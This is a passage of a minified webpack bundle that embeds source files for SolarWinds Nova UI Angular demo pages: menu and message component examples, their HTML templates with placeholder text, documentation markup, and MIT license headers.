       { title: "Selected menu item", isSelected: true },\n                { title: "Menu item", itemType: "switch", checked: true },\n                {\n                    title: "Menu disabled item with long text",\n                    itemType: "switch",\n                    checked: false,\n                    disabled: true,\n                },\n                {\n                    title: "Menu item with checkbox",\n                    itemType: "option",\n                    disabled: true,\n                },\n                {\n                    title: "Menu item with icon",\n                    itemType: "action",\n                    icon: "table",\n                },\n                {\n                    title: "Link menu item",\n                    itemType: "link",\n                    url: "#button",\n                    disabled: true,\n                },\n                {\n                    title: "Export PDF",\n                    itemType: "link",\n                    icon: "export-pdf",\n                    url: "#button",\n                },\n            ],\n        },\n        {\n            header: "section 2 title",\n            itemsSource: [\n                {\n                    title: "Menu Item1",\n                    itemType: "option",\n                    action: this.actionDone,\n                },\n                {\n                    title: "Menu Item2",\n                    itemType: "option",\n                    action: this.actionDone,\n                },\n                {\n                    title: "Menu Item3",\n                    itemType: "option",\n                    action: this.actionDone,\n                },\n            ],\n        },\n    ];\n\n    public actionDone(): void {\n        console.log("Action Done");\n    }\n\n    public actionWithParams(index: number): void {\n        console.log("action", this.itemsSource[0].itemsSource[index].title);\n    }\n}\n'},17723:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiButtonModule,\n    NuiDocsModule,\n    NuiMenuModule,\n    NuiMessageModule,\n    NuiSwitchModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    BasicMenuExampleComponent,\n    MenuAppendToBodyExampleComponent,\n    MenuCustomItemExampleComponent,\n    MenuExampleComponent,\n    MenuItemVariationsExampleComponent,\n    MenuTestComponent,\n    MenuVisualTestComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: MenuExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "basic",\n        component: BasicMenuExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "menu-visual-test",\n        component: MenuVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "menu-test",\n        component: MenuTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiButtonModule,\n        NuiMenuModule,\n        NuiDocsModule,\n        NuiMessageModule,\n        NuiSwitchModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        BasicMenuExampleComponent,\n        MenuExampleComponent,\n        MenuAppendToBodyExampleComponent,\n        MenuItemVariationsExampleComponent,\n        MenuCustomItemExampleComponent,\n        MenuTestComponent,\n        MenuVisualTestComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("menu"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class MenuModule {}\n'},39218:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./message-basic/message-basic.example.component";\nexport * from "./message-critical/message-critical.example.component";\nexport * from "./message-info/message-info.example.component";\nexport * from "./message-manual-control/message-manual-control.example.component";\nexport * from "./message-docs/message-docs.example.component";\nexport * from "./message-not-dismissable/message-not-dismissable.example.component";\nexport * from "./message-ok/message-ok.example.component";\nexport * from "./message-warning/message-warning.example.component";\nexport * from "./message-visual-test/message-visual-test.component";\nexport * from "./message-test/message-test.component";\n'},37372:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-message type="ok" i18n>\n    <b>Simple help message.</b> Cius dit vellab idunt acestot aturecu.\n    <a href="../components/MessageComponent.html" target="_blank">Learn More</a>\n</nui-message>\n'},37036:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-message-basic-example",\n    templateUrl: "./message-basic.example.component.html",\n})\nexport class MessageBasicExampleComponent {}\n'},86824:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-message type="critical" (dismiss)="onMessageDismiss()" i18n>\n    <b>Simple critical message.</b> Cius dit vellab idunt acestot aturecu.\n    <a href="../components/MessageComponent.html" target="_blank">Learn More</a>\n</nui-message>\n\n<nui-message\n    type="critical"\n    [allowDismiss]="true"\n    (dismiss)="onMessageDismiss()"\n    i18n\n>\n    <b>Emphasize part.</b> Cius dit vellab idunt acestot aturecu lluptaepe eum\n    qui con ciusae dolenis moditatiusam es dolum sollor aliquam. Cius dit vellab\n    idunt acestot aturecu ciusae dolenis moditatiusam es dolum sollor aliquam.\n    Cius dit vellab idunt acestot aturecu ciusae dolenis moditatiusam es dolum\n    sollor aliquam. Cius dit vellab idunt acestot aturecu ciusae dolenis\n    moditatiusam es dolum sollor aliquam.\n    <a href="../components/MessageComponent.html" target="_blank">Learn More</a>\n</nui-message>\n'},52248:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-message-critical-example",\n    templateUrl: "./message-critical.example.component.html",\n})\nexport class MessageCriticalExampleComponent {\n    public onMessageDismiss(): void {\n        console.log("Message was dismissed");\n    }\n}\n'},24572:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<p>\n    <code>&lt;nui-message&gt;</code> allows easy customization of messages, e.g.\n    setting message display style, description and dismissability by passing\n    message type, content text, allowing, disallowing or preventing message\n    dismiss.\n</p>\n\n<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiMessageModule</code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n\n<p>\n    To implement a message you need to pass the type of a message into the\n    <code>type</code> property and message text inside\n    <code>&lt;nui-message&gt;</code> component.\n</p>\n\n<nui-example-wrapper filenamePrefix="message-basic" exampleTitle="Basic Usage">\n    <nui-message-basic-example></nui-message-basic-example>\n</nui-example-wrapper>\n\n<h2>Messages Types</h2>\n\n<p>\n    Possible types of messages are: <code>critical</code> |\n    <code>warning</code> | <code>ok</code> | <code>info</code>.\n</p>\n\n<h2>Critical</h2>\n\n<p>\n    Something is wrong, but it\'s not a system error. The user\n    <b>cannot</b> continue without fixing something, i.e. they\'re essentially\n    blocked.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="message-critical"\n    exampleTitle="Critical Message"\n>\n    <nui-message-critical-example></nui-message-critical-example>\n</nui-example-wrapper>\n\n<h2>Warning</h2>\n\n<p>\n    There is an issue, but user can continue in the flow, however it is not\n    recommended.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="message-warning"\n    exampleTitle="Warning Message"\n>\n    <nui-message-warning-example></nui-message-warning-example>\n</nui-example-wrapper>\n\n<h2>Success</h2>\n\n<p>\n    Use this type of message to inform user about success of performed action.\n</p>\n\n<nui-example-wrapper filenamePrefix="message-ok" exampleTitle="Ok Message">\n    <nui-message-ok-example></nui-message-ok-example>\n</nui-example-wrapper>\n\n<h2>Informative</h2>\n\n<p>\n    Use this type of message for recommendations, tips, tricks, explanations or\n    any non-state dependant information.\n</p>\n\n<nui-example-wrapper filenamePrefix="message-info" exampleTitle="Info Message">\n    <nui-message-info-example></nui-message-info-example>\n</nui-example-wrapper>\n\n<h2>Not Allowed Dismiss</h2>\n\n<p>\n    Value of <code>allowDismiss</code> control message\'s persistency and\n    dismissability. False statement makes \'cross\' icon on message dissappear. By\n    default value of <code>allowDismiss</code> is true.\n    <br />\n    <code>[allowDismiss]</code> : false\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="message-not-dismissable"\n    exampleTitle="Not Dismissable Message"\n>\n    <nui-message-not-dismissable-example></nui-message-not-dismissable-example>\n</nui-example-wrapper>\n\n<h2>Manual Destroy Control</h2>\n\n<p>\n    To prevent the message from being completely removed from the DOM on user\n    dismissal, pass an rxjs Subject via the\n    <code>manualDestroyControl</code> input. The Subject may optionally be used\n    to show and hide the message manually by calling\n    <code>Subject.next</code> with a payload of true to show it or false to hide\n    it.\n</p>\n<nui-example-wrapper\n    filenamePrefix="message-manual-control"\n    exampleTitle="Manual Destroy Control"\n>\n    <nui-message-manual-control-example></nui-message-manual-control-example>\n</nui-example-wrapper>\n'},73708:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-message-docs-example",\n    templateUrl: "./message-docs.example.component.html",\n})\nexport class MessageDocsComponent {}\n'},69482:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-message type="info" (dismiss)="onMessageDismiss()" i18n>\n    <b>Simple info message.</b> Cius dit vellab idunt acestot aturecu.\n    <a href="../components/MessageComponent.html" target="_blank">Learn More</a>\n</nui-message>\n\n<nui-message type="info" (dismiss)="onMessageDismiss()" i18n>\n    <b>Emphasize part.</b> Cius dit vellab idunt acestot aturecu lluptaepe eum\n    qui con ciusae dolenis moditatiusam es dolum sollor aliquam. Cius dit vellab\n    idunt acestot aturecu ciusae dolenis moditatiusam es dolum sollor aliquam.\n    Cius dit vellab idunt acestot aturecu ciusae dolenis moditatiusam es dolum\n    sollor aliquam. Cius dit vellab idunt acestot aturecu ciusae dolenis\n    moditatiusam es dolum sollor aliquam.\n    <a href="../components/MessageComponent.html" target="_blank">Learn More</a>\n</nui-message>\n'},53078:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-message-info-example",\n    templateUrl: "./message-info.example.component.html",\n})\nexport class MessageInfoExampleComponent {\n    onMessageDismiss(): void {\n        console.log("Message was dismissed");\n    }\n}\n'},10038:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<button class="mb-2" nui-button type="button" (click)="toggleMessage()">\n    Toggle state of message\n</button>\n<nui-message\n    (dismiss)="onMessageDismiss()"\n    type="ok"\n    [manualControl]="messageVisibilitySubject"\n    i18n\n>\n    <b>Simple help message.</b> Cius dit vellab idunt acestot aturecu.\n    <a href="../components/MessageComponent.html" target="_blank">Learn More</a>\n</nui-message>\n'},91650:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { Subject } from "rxjs";\n\n@Component({\n    selector: "nui-message-manual-control-example",\n    templateUrl: "./message-manual-control.example.component.html",\n})\nexport class MessageManualControlExampleComponent {\n    public isVisible: boolean = true;\n    public messageVisibilitySubject = new Subject<boolean>();\n\n    public onMessageDismiss(): void {\n        this.isVisible = !this.isVisible;\n    }\n\n    public toggleMessage(): void {\n        this.isVisible = !this.isVisible;\n        this.messageVisibilitySubject.next(this.isVisible);\n    }\n}\n'},51336:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-message type="warning" [allowDismiss]="false" i18n>\n    <b>This is a message with not allowed dismiss.</b> Cius dit vellab idunt\n    acestot aturecu lluptaepe eum qui con ciusae dolenis moditatiusam es dolum\n    sollor aliquam. Cius dit vellab idunt acestot aturecu ciusae dolenis\n    moditatiusam es dolum sollor aliquam. Cius dit vellab idunt acestot aturecu\n    ciusae dolenis moditatiusam es dolum sollor aliquam.\n    <a href="../components/MessageComponent.html" target="_blank">Learn More</a>\n</nui-message>\n'},24184:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-message-not-dismissable-example",\n    templateUrl: "./message-not-dismissable.example.component.html",\n})\nexport class MessageNotDismissableExampleComponent {}\n'},95654:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-message type="ok" (dismiss)="onMessageDismiss()" i18n>\n    <b>Simple help message.</b> Cius dit vellab idunt acestot aturecu.\n    <a href="../components/MessageComponent.html" target="_blank">Learn More</a>\n</nui-message>\n\n<nui-message type="ok" (dismiss)="onMessageDismiss()" i18n>\n    <b>Emphasize part.</b> Cius dit vellab idunt acestot aturecu lluptaepe eum\n    qui con ciusae dolenis moditatiusam es dolum sollor aliquam. Cius dit vellab\n    idunt acestot aturecu ciusae dolenis moditatiusam es dolum sollor aliquam.\n    Cius dit vellab idunt acestot aturecu ciusae dolenis moditatiusam es dolum\n    sollor aliquam. Cius dit vellab idunt acestot aturecu ciusae dolenis\n    moditatiusam es dolum sollor aliquam.\n    <a href="../components/MessageComponent.html" target="_blank">Learn More</a>\n</nui-message>\n'},60754:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-message-ok-example",\n    templateUrl: "./message-ok.example.component.html",\n})\nexport class MessageOkExampleComponent {\n    public onMessageDismiss(): void {\n        console.log("Message was dismissed");\n    }\n}\n'},71378:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-message\n    id="nui-demo-message-dismiss-not-allowed"\n    type="warning"\n    [allowDismiss]="false"\n    i18n\n>\n    <b>This is a message with not allowed dismiss.</b> Cius dit vellab idunt\n    acestot aturecu lluptaepe eum qui con ciusae dolenis moditatiusam es dolum\n    sollor aliquam. Cius dit vellab idunt acestot aturecu ciusae dolenis\n    moditatiusam es dolum sollor aliquam. Cius dit vellab idunt acestot aturecu\n    ciusae dolenis moditatiusam es dolum sollor aliquam.\n    <a href="../components/MessageComponent.html" target="_blank">Learn More</a>\n</nui-message>\n\n<nui-message\n    id="nui-demo-message-dismiss-allowed"\n    type="ok"\n    (dismiss)="onMessageDismiss()"\n    i18n\n>\n    <b>Simple help message.</b> Cius dit vellab idunt acestot aturecu.\n    <a href="../components/MessageComponent.html" target="_blank">Learn More</a>\n</nui-message>\n\n<nui-message-manual-control-example\n    id="nui-demo-message-manual-control"\n></nui-message-manual-control-example>\n'},12558:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "message-test-component",\n    templateUrl: "message-test.component.html",\n})\nexport class MessageTestComponent {\n    public onMessageDismiss(): void {\n        console.log("Message was dismissed");\n    }\n}\n'},19760:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <div class="row">\n        <div class="col">\n            <h3>Critical message</h3>\n            <nui-message type="critical">\n                <b>Simple critical message.</b> Cius dit vellab idunt acestot\n                aturecu.\n                <a href="../components/MessageComponent.html" target="_blank"\n                    >Learn More</a\n                >\n            </nui-message>\n\n            <nui-message type="critical">\n                <b>Emphasize part.</b> Cius dit vellab idunt acestot aturecu\n                lluptaepe eum qui con ciusae dolenis moditatiusam es dolum\n                sollor aliquam.\n                <a href="../components/MessageComponent.html" target="_blank"\n                    >Learn More</a\n                >\n            </nui-message>\n        </div>\n        <div class="col">\n            <h3>Warning message</h3>\n            <nui-message type="warning">\n                <b>Simple warning message.</b> Cius dit vellab idunt acestot\n                aturecu.\n                <a href="../components/MessageComponent.html" target="_blank"\n                    >Learn More</a\n                >\n            </nui-message>\n\n            <nui-message type="warning">\n                <b>Emphasize part.</b> Cius dit vellab idunt acestot aturecu\n                lluptaepe eum qui con ciusae dolenis moditatiusam es dolum\n                sollor aliquam.\n                <a href="../components/MessageComponent.html" target="_blank"\n                    >Learn More</a\n                >\n            </nui-message>\n        </div>\n        <div class="w-100"></div>\n        <div class="col">\n            <h3>Success message</h3>\n            <nui-message type="ok">\n                <b>Simple help message.</b> Cius dit vellab idunt acestot\n                aturecu.\n                <a href="../components/MessageComponent.html" target="_blank"\n                    >Learn More</a\n                >\n            </nui-message>\n\n            <nui-message type="ok">\n                <b>Emphasize part.</b> Cius dit vellab idunt acestot aturecu\n                lluptaepe eum qui con ciusae dolenis moditatiusam es dolum\n                sollor aliquam.\n                <a href="../components/MessageComponent.html" target="_blank"\n                    >Learn More</a\n                >\n            </nui-message>\n        </div>\n        <div class="col">\n            <h3>Info message</h3>\n            <nui-message type="info">\n                <b>Simple info message.</b> Cius dit vellab idunt acestot\n                aturecu.\n                <a href="../components/MessageComponent.html" target="_blank"\n                    >Learn More</a\n                >\n            </nui-message>\n\n            <nui-message type="info">\n                <b>Emphasize part.</b> Cius dit vellab idunt acestot aturecu\n                lluptaepe eum qui con ciusae dolenis moditatiusam es dolum\n                sollor aliquam.\n                <a href="../components/MessageComponent.html" target="_blank"\n                    >Learn More</a\n                >\n            </nui-message>\n        </div>\n        <div class="w-100"></div>\n        <div class="col">\n            <h3>Not dismissable info message</h3>\n            <nui-message type="info" [allowDismiss]="false">\n                <b>Simple NOT DISMISSABLE info message.</b> Cius dit vellab\n                idunt acestot aturecu.\n                <a href="../components/MessageComponent.html" target="_blank"\n                    >Learn More</a\n                >\n            </nui-message>\n        </div>\n    </div>\n</div>\n'},19792:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-message-visual-test",\n    templateUrl: "./message-visual-test.component.html",\n})\nexport class MessageVisualTestComponent {}\n'},89776:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-message type="warning" (dismiss)="onMessageDismiss()" i18n>\n    